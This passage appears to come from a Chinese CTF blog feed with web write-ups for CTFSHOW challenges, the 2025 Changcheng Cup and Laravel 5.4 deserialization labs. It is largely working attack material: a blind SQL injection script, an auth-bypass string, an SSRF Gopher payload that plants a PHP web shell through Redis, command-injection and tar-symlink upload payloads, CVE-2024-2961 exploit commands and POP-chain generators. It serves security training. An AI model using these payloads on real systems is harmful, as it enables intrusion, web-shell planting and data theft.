invoke__">preg_match</span>(<span class="string">&#x27;/\:|\,/&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以继续用上题的方法，flag在数据库</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919140210540.png"></p><h3 id="web496"><a href="#web496" class="headerlink" title="web496"></a>web496</h3><p>查看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919160055184.png"></p><p>发现反序列化代码被注释了，然后SQL正则那里多了一些过滤，可以用万能密码登录系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：&#x27;||1=1#</span><br><span class="line">密码：1</span><br></pre></td></tr></table></figure><p>进去后点击基本资料，可以看到管理员信息修改</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919160313802.png"></p><p>查看网页源码，发现是通过POST发送请求到<code>api/admin_edit.php</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250919160417338.png"></p><p>我们查看<code>api/admin_edit.php</code>的源码，GET请求<code>/index.php?action=../api/admin_edit</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250919160602365.png"></p><p>可以看到有个update语句，然后下面有修改成功和失败的文本信息。那我们的思路就是写个脚本，先用万能密码登录保持登录状态，然后在<code>user[username]</code>数组里写payload进行布尔盲注，同时要保证<code>nickname</code>不重复</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eb072399-7e45-41c9-a2dd-d30c29f993ee.challenge.ctf.show&quot;</span></span><br><span class="line">chars = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890[]&#123;&#125;,.-_&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">session = requests.session()</span><br><span class="line">session.post(url + <span class="string">&quot;?action=check&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;&#x27;||1=1#&quot;</span>, <span class="string">&quot;password&quot;</span>:<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">        <span class="comment">#payload = &quot;&#x27;||if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27;,1,0)#&quot;.format(pos, c)</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27;||if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flagyoudontknow76&#x27;),&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27;,1,0)#&quot;.format(pos, c)</span></span><br><span class="line">        payload = <span class="string">&quot;&#x27;||if(substr((select flagisherebutyouneverknow118 from flagyoudontknow76),&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27;,1,0)#&quot;</span>.<span class="built_in">format</span>(pos, c)</span><br><span class="line">        data = &#123;<span class="string">&#x27;nickname&#x27;</span>: <span class="built_in">str</span>(pos), <span class="string">&#x27;user[username]&#x27;</span>: payload&#125;</span><br><span class="line">        response = session.post(url + <span class="string">&quot;/api/admin_edit.php&quot;</span>, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u529f&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += c</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>运行脚本得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919161845973.png"></p><h3 id="web497"><a href="#web497" class="headerlink" title="web497"></a>web497</h3><p>查看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919162859971.png"></p><p><code>$user=unserialize($c)</code>的注释去掉了，但是前面的正则匹配加了感叹号，也就是不能出现冒号和逗号，那我们不走这个方法，继续用万能密码登录系统，账号<code>&#39;||1=1#</code>，密码1</p><p>然后点击基本信息，发现头像处可以修改</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919163257641.png"></p><p>直接file协议读取flag文件，存在SSRF漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///flag</span><br></pre></td></tr></table></figure><p>修改成功后右键点击头像，选择在新标签页中打开图像，成功读到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919163616708.png"></p><h3 id="web498"><a href="#web498" class="headerlink" title="web498"></a>web498</h3><p>也是上一题的方法，读<code>/etc/passwd</code>可以，但是读flag读不到了，可能是权限不足，也可能是flag不叫这个名字了或者在其他目录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919164623045.png"></p><p>刚好看到<code>/etc/passwd</code>里面有个<code>redis</code>，输入<code>dict://127.0.0.1:6379</code>探测端口开放情况</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919165013133.png"></p><p>用Gopher协议打SSRF就可以，工具Gopherus</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919165755580.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2428%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B1%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br></pre></td></tr></table></figure><p>然后访问<code>/shell.php</code>，查看根目录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919170108628.png"></p><p>读取flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919170150512.png"></p><h3 id="web499"><a href="#web499" class="headerlink" title="web499"></a>web499</h3><p>头像地址没了，SSRF打不通</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919171305287.png"></p><p>随便点了一下，发现系统配置可以打开</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919171403711.png"></p><p>查看源代码，发现有个<code>api/admin_settings.php</code>路径</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919171548037.png"></p><p>查看<code>api/admin_settings.php</code>源码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919171632228.png"></p><p>关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings.php&#x27;</span>));</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$config</span>[<span class="variable">$key</span>]=<span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings.php&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$config</span>));</span><br></pre></td></tr></table></figure><p>它会把POST传进来的键值对放入数组，然后写入文件<code>config/settings.php</code>，我们看看<code>config/settings.php</code>源码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919172158824.png"></p><p>刚好对应的就是前面的系统配置页面，那我们在系统配置页面传入一句话木马</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919172300775.png"></p><p>可以看到木马已经成功写入</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250919172337292.png"></p><p>蚁剑连接</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919172431100.png"></p><p>在根目录找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919172511649.png"></p><h3 id="web500"><a href="#web500" class="headerlink" title="web500"></a>web500</h3><p>上题的代码改了，不是写到php文件了，那我们换个方法</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919173105728.png"></p><p>回到管理页面点了一通，发现数据库备份可以打开</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919173204845.png"></p><p>查看源码，发现其POST请求发送到<code>api/admin_db_backup.php</code>，那我们读取源码看看</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919173335345.png"></p><p>关键代码<code>shell_exec(&#39;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#39;.__DIR__.&#39;/../backup/&#39;.$db_path)</code>，那我们可以拼接命令读取flag</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat /f*&gt;/var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250919173936696.png"></p><p>然后访问<code>1.txt</code>读取flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919174019841.png"></p><h3 id="web501"><a href="#web501" class="headerlink" title="web501"></a>web501</h3><p>这次修改名称的地方不见了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919175239848.png"></p><p>查看代码，发现其多了个正则匹配</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919175314191.png"></p><p>因为前面有个<code>extract($_POST)</code>，然后数据库备份的源码写了POST请求的目标地址</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919175556653.png"></p><p>那我们可以直接向目标地址发送POST请求执行命令</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919175624300.png"></p><p>然后访问<code>/1.txt</code>读取flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919175658035.png"></p>]]></content>
    
    
    <summary type="html">CTFSHOW 中期测评第一部分详细题解</summary>
    
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/categories/CTFSHOW/"/>
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/tags/CTFSHOW/"/>
    
  </entry>
  
  <entry>
    <title>2025第五届长城杯网络安全大赛初赛 Web方向 WP</title>
    <link href="https://waynejoon.github.io/posts/ctf-2025changcheng-web-wp/"/>
    <id>https://waynejoon.github.io/posts/ctf-2025changcheng-web-wp/</id>
    <published>2025-09-15T02:36:29.000Z</published>
    <updated>2025-09-15T02:52:04.849Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="文曲签学"><a href="#文曲签学" class="headerlink" title="文曲签学"></a>文曲签学</h3><p>长按Fn进入调试模式，输入<code>#HELP</code>可以查看帮助</p><p><img src="https://oss.waynejoons.icu/picphoto/20250915102830888.png"></p><p>输入<code>#LIST</code>可以查看列表，再输入<code>#READ HINT</code>获得提示</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250914154212158.png"></p><p>在公众号获得提示</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250914154250491.png"></p><p>双写..&#x2F;进行目录穿越，读取flag</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250914154432688.png"></p><h3 id="EZ-upload"><a href="#EZ-upload" class="headerlink" title="EZ_upload"></a>EZ_upload</h3><p>打开之后上传一个文件，得到源码</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250914154646126.png"></p><p>文件移动成功后执行命令 <code>cd /tmp &amp;&amp; tar -xvf &#39; . $filename.&#39;&amp;&amp;pwd</code>，即进入 <code>/tmp/</code> 目录，解压上传的文件，然后显示当前路径</p><p>关键就是这一行代码，将文件按tar格式解压。我们写入木马到tar文件，然后想办法让其解压到<code>/var/www/html</code>即可</p><p>打开本地虚拟机，先创建一个符号链接，指向<code>/var/www/html</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /var/www/html su</span><br></pre></td></tr></table></figure><p>然后往<code>/var/www/html</code>写入一句话木马，命名<code>1.php</code></p><p>接着把符号链接su写入<code>su1.tar</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf su1.tar su</span><br></pre></td></tr></table></figure><p>然后再把木马写入<code>su2.tar</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf su2.tar su/1.php</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250914155830860.png"></p><p>先上传<code>su1.tar</code>，再上传<code>su2.tar</code>，解压后木马就可以写到<code>/var/www/html</code>目录里面</p><p>然后访问<code>1.php</code>，没有报404，说明成功写入</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250914160141742.png"></p><p>蚁剑连接</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250914160219419.png"></p><p>根目录找到<code>flllllll1111ag</code></p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250914160254159.png"></p><h3 id="SeRce"><a href="#SeRce" class="headerlink" title="SeRce"></a>SeRce</h3><p>打开后看到题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$exp</span> = <span class="variable">$_GET</span>[<span class="string">&quot;exp&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$exp</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$exp</span>)) != <span class="variable">$exp</span>)&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filetoread&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File Contents: <span class="subst">$data</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要先满足 <code>serialize(unserialize($exp)) != $exp</code> 才可以用 <code>file_get_contents</code> 读取文件。一开始exp还弄得很长，但其实很简单，输入个<code>1</code>就可以，<code>1</code> 并不是合法的序列化格式，<code>unserialize(&quot;1&quot;)</code> 返回 <code>false</code> 并且会触发一个警告，但是 PHP 的 <code>serialize(false)</code> 会返回字符串 <code>&quot;b:0;&quot;</code>，和输入 <code>&quot;1&quot;</code> 不同，因此条件成立</p><p>然后<code>filetoread</code>写入文件路径，例如<code>/etc/passwd</code>，POST发送</p><p><img src="https://oss.waynejoons.icu/picphoto/20250914211929319.png"></p><p>后面尝试寻找flag找不到，想起来之前见过一个由<code>file_get_contents</code>到任意命令执行的漏洞，上网搜索一番，找到<code>CVE-2024-2961</code>，大概就是GNU C库glibc中<code>iconv()</code>函数的缓冲区溢出漏洞。漏洞会在将字符串转换为ISO-2022-CN-EXT字符集时，导致输出缓冲区最多溢出4字节，从而引发程序崩溃或覆盖内存</p><p>参考文章：<a href="https://xz.aliyun.com/news/14986">从多个比赛引发的CVE-2024-2961漏洞学习思考-先知社区</a></p><p>这里用工具来做，地址：<a href="https://github.com/ambionics/cnext-exploits">https://github.com/ambionics/cnext-exploits</a></p><p>工具下载到虚拟机后，要根据题目修改<code>cnext-exploit.py</code>代码，具体如下</p><p><img src="https://oss.waynejoons.icu/picphoto/20250914212830497.png"></p><p>然后执行命令，因为当前用户为<code>www-data</code>，权限很低，所以把文件写到<code>/tmp</code>目录下，<code>/tmp</code> 通常默认可读写，其他目录需确认权限</p><p>先读取根目录文件有什么</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cnext-exploit.py https://eci-2ze1g7zvc6cw53q7usqk.cloudeci1.ichunqiu.com:80?exp=1 <span class="string">&quot;ls / &gt; /tmp/1.txt&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250914213539896.png"></p><p>直接读取flag发现无法读取，后面查看readflag发现是个程序，且当前用户具备执行权限，可以运行获取flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cnext-exploit.py https://eci-2ze1g7zvc6cw53q7usqk.cloudeci1.ichunqiu.com:80?exp=1 <span class="string">&quot;/readflag &gt; /tmp/flag.txt&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250914213232525.png"></p><p>返回题目，修改POST读取<code>/tmp/flag.txt</code>即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250914213321747.png"></p>]]></content>
    
    
    <summary type="html">第五届“长城杯”网络安全大赛暨京津冀蒙网络安全技能竞赛初赛 Web方向 题解WP</summary>
    
    
    
    <category term="CTF赛事" scheme="https://waynejoon.github.io/categories/CTF%E8%B5%9B%E4%BA%8B/"/>
    
    
    <category term="CTF赛事" scheme="https://waynejoon.github.io/tags/CTF%E8%B5%9B%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW 框架复现 web466 - web476</title>
    <link href="https://waynejoon.github.io/posts/ctfshow-framework-exploits-web466-web476/"/>
    <id>https://waynejoon.github.io/posts/ctfshow-framework-exploits-web466-web476/</id>
    <published>2025-09-12T05:05:27.000Z</published>
    <updated>2025-11-10T04:10:39.156Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web466"><a href="#web466" class="headerlink" title="web466"></a>web466</h3><p>参考文章：<a href="https://xz.aliyun.com/news/10450#toc-0">代码审计学习—Laravel5.4</a></p><p>做题前一定要先看一遍漏洞复现，自行跟着去验证一下</p><p>第一条链子因为<code>Faker\Generator.php</code>里有个<code>__wakeup()</code>，反序列化时会把<code>formatters</code>数组清空，用不了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250911161317967.png"></p><p>所以这里我们用第二条链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Validation</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Validator</span> &#123;</span><br><span class="line">       <span class="title class_">public</span> $<span class="title class_">extensions</span> = [];</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;extensions = [<span class="string">&#x27;&#x27;</span> =&gt; <span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span> &#123;</span><br><span class="line">    <span class="title class_">use</span>  <span class="title class_">Illuminate</span>\<span class="title class_">Validation</span>\<span class="title class_">Validator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="keyword">new</span> <span class="title class_">Validator</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event = <span class="variable">$cmd</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingBroadcast</span>(<span class="string">&#x27;cat /flag&#x27;</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行得到结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MzE6IklsbHVtaW5hdGVcVmFsaWRhdGlvblxWYWxpZGF0b3IiOjE6e3M6MTA6ImV4dGVuc2lvbnMiO2E6MTp7czowOiIiO3M6Njoic3lzdGVtIjt9fXM6ODoiACoAZXZlbnQiO3M6OToiY2F0IC9mbGFnIjt9</span><br></pre></td></tr></table></figure><p>然后GET传入<code>/admin/序列化数据</code>即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250911161710275.png"></p><h3 id="web467"><a href="#web467" class="headerlink" title="web467"></a>web467</h3><p>参考文章：<a href="https://xz.aliyun.com/news/8977#toc-6">Laravel5.4 反序列化漏洞挖掘</a></p><p>这里面第一条链子和第二条链子在题目里面用不了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250911163835002.png"></p><p>用第三条链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">use</span>  <span class="title class_">Illuminate</span>\<span class="title class_">Events</span>\<span class="title class_">Dispatcher</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="keyword">new</span> <span class="title class_">Dispatcher</span>(<span class="variable">$cmd</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event=<span class="variable">$cmd</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingBroadcast</span>(<span class="variable">$argv</span>[<span class="number">1</span>])));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Events</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">       <span class="title class_">protected</span> $<span class="title class_">listeners</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$event</span></span>)</span>&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;listeners=[<span class="variable">$event</span>=&gt;[<span class="string">&#x27;system&#x27;</span>]];</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存文件为<code>1.php</code>，在终端执行命令<code>php 1.php &quot;cat /flag&quot;</code>，得到结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086Mjg6IklsbHVtaW5hdGVcRXZlbnRzXERpc3BhdGNoZXIiOjE6e3M6MTI6IgAqAGxpc3RlbmVycyI7YToxOntzOjk6ImNhdCAvZmxhZyI7YToxOntpOjA7czo2OiJzeXN0ZW0iO319fXM6ODoiACoAZXZlbnQiO3M6OToiY2F0IC9mbGFnIjt9</span><br></pre></td></tr></table></figure><p>同样的，GET传入<code>/admin/序列化数据</code>得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250911164804078.png"></p><h3 id="web468"><a href="#web468" class="headerlink" title="web468"></a>web468</h3><p>参考文章：<a href="https://www.cnblogs.com/shivers0x72/p/14800109.html">laravel5.4反序列化 - Shivers0x72</a></p><p>用第二个方法，也就是<code>src/Illuminate/Support/Manager.php</code>那个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Notifications</span>\<span class="title class_">ChannelManager</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;events = <span class="keyword">new</span> <span class="title class_">ChannelManager</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$seri</span> = <span class="keyword">new</span> <span class="title class_">PendingBroadcast</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span 